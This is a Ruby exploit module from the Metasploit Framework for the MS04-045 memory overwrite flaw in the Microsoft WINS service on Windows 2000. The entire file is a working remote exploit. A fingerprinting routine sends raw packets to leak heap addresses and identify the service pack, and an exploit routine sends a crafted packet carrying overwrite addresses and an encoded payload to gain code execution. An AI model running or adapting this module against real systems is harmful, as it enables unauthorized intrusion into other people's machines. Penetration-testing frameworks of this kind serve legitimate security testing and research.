##
# $Id: ms04_045_wins.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft WINS Service Memory Overwrite',
			'Description'    => %q{
				This module exploits an arbitrary memory write flaw in the
				WINS service. This exploit has been tested against Windows
				2000 only.

			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2004-1080'],
					[ 'OSVDB', '12378'],
					[ 'BID', '11763'],
					[ 'MSB', 'MS04-045'],

				],
			'Privileged'     => true,
			'DefaultOptions'  =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 8000,
					'MinNops'  => 512,
					'StackAdjustment' => -3500,

				},
			'Targets'        =>
				[
					[
						'Windows 2000 English', # Tested OK - 11/25/2005 hdm
						{
							'Platform' => 'win',
							'Rets'     => [ 0x5391f40, 0x53df4c4, 0x53922e0],
						},
					],
				],
			'DisclosureDate' => 'Dec 14 2004',
			'DefaultTarget' => 0))

			register_options(
				[
					Opt::RPORT(42)
				], self.class )
	end

	def check
		ret = fprint()

		info = 'This system is running '
		info << ((ret[1] == '?') ? 'an unknown windows version ' : "Windows #{ret[1]} ")
		info << ((ret[2] == '?') ? '' : "with service pack #{ret[2]} ")
		info << (ret[3] ? '(clean heap)' : '(dirty heap)')

		print_status(info)
		return ret[0]
	end

	def exploit
		ret = fprint()

		if (ret[0] != Exploit::CheckCode::Vulnerable)
			print_status("This system does not appear to be vulnerable")
			return
		end

		# Windows 2000 SP0, SP2, SP3, SP4 only. SP1 does not have the
		# same function pointer...
		if (ret[1] != '2000' or ret[2] !~ /^[0234]/)
			print_status("This target is not currently supported")
			return
		end

		# This flag is un-set if the first leaked address is not the default of
		# 0x05371e90. This can indicate that someone has already tried to exploit
		# this system, or something major happened to the heap that will probably
		# prevent this exploit from working.
		if (not ret[3])
			print_status("Warning: the leaked heap address indicates that this attack may fail");
		end

		# The base address of our structure in memory
		base = target['Rets'][0]

		# Address of the function pointers to overwrite (courtesy anonymous donor)
		targ = target['Rets'][1]

		# Address of the payload on the heap, past the structure
		code = target['Rets'][2]

		# Build up the wins packet
		addr = ''
		addr << ([code].pack('V') * 9)
		addr << ([targ - 0x48].pack('V') * 14)

		wins = addr * 10
		wins << payload.encoded
		wins << rand_text_english(9200-wins.length, payload_badchars)

		wpkt = [wins.length + 8, -1, base].pack('NNN')
		wpkt << wins

		print_status(sprintf("Attempting to overwrite 0x%.8x with 0x%.8x (0x%.8x)", targ, code, base))

		# Connect and send the request
		connect
		sock.put(wpkt)
		handler
		disconnect
	end

	# This fingerprinting routine will cause the structure base address to slide down
	# 120 bytes. Subsequent fingerprints will not push this down any futher, however
	# we need to make sure that fingerprint is always called before exploitation or
	# the alignment will be way off.
	def fprint

		ret = [Exploit::CheckCode::Safe, '', '', '']

		req = "\x00\x00\x00\x29\x00\x00\x78\x00\x00\x00\x00\x00"+
			"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x02\x00\x05"+
			"\x00\x00\x00\x00\x60\x56\x02\x01\x00\x1F\x6E\x03"+
			"\x00\x1F\x6E\x03\x08\xFE\x66\x03\x00"

		connect
		sock.put(req)
		data = sock.get_once
		return ret if not data

		ptrs = [ data[16,4].unpack('N')[0] ].concat( data[32,12].unpack('VVV') )

		print_status(sprintf("WINS Fingerprint: [0x%.8x] 0x%.8x 0x%.8x 0x%.8x", *ptrs))

		os = '2000'
		sp = '?'
		vi = false

		# Check for Windows 2000 systems
		case ptrs[3]
			when 0x77f8ae78
				sp = '0'
			when 0x77f81f70
				sp = '1'
			when 0x77f82680
				sp = '2'
			when 0x77f83608
				sp = '3'
			when 0x77f89640
				sp = '4'
			when 0x77f82518
				sp = '5'
			when 0x77f81648 # Contributed by grutz[at]jingojango.net
				sp = '3/4'
		end

		# Reset the OS string if no match was found
		os = '?' if sp == '?'

		# Check for Windows NT 4.0 systems
		if (ptrs[0] > 0x02300000 and ptrs[0] < 0x02400000)
			os = 'NT'
			sp = '?'
		end

		# Heap is still pristine...
		vi = true if ptrs[0] == 0x05371e90

		# Determine if the patch has already been applied
		req = "\x00\x00\x00\x0F\x00\x00\x78\x00" + data[16, 4] +
			"\x00\x00\x00\x03\x00\x00\x00\x00"

		sock.put(req)
		data = sock.get_once
		disconnect

		ret[1] = os
		ret[2] = sp
		ret[3] = vi

		if (data and data[6, 1] == "\x78")
			ret[0] = Exploit::CheckCode::Vulnerable
		end

		return ret
	end

end

